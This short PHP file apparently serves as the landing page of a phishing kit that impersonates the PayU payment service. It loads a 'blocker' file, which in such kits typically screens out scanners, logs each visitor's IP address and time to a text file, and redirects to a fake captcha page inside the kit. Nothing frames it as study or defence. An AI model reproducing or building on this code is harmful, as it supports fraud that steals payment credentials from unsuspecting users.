<?php 
include("./PAYU/blocker.php");

$ip = getenv("REMOTE_ADDR");
$file = fopen("Vu.txt","a");
fwrite($file,$ip."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")."\n");
$src="PAYU/captcha.php";
header("Location: PAYU/captcha.php{$_SESSION['randString']}");
?>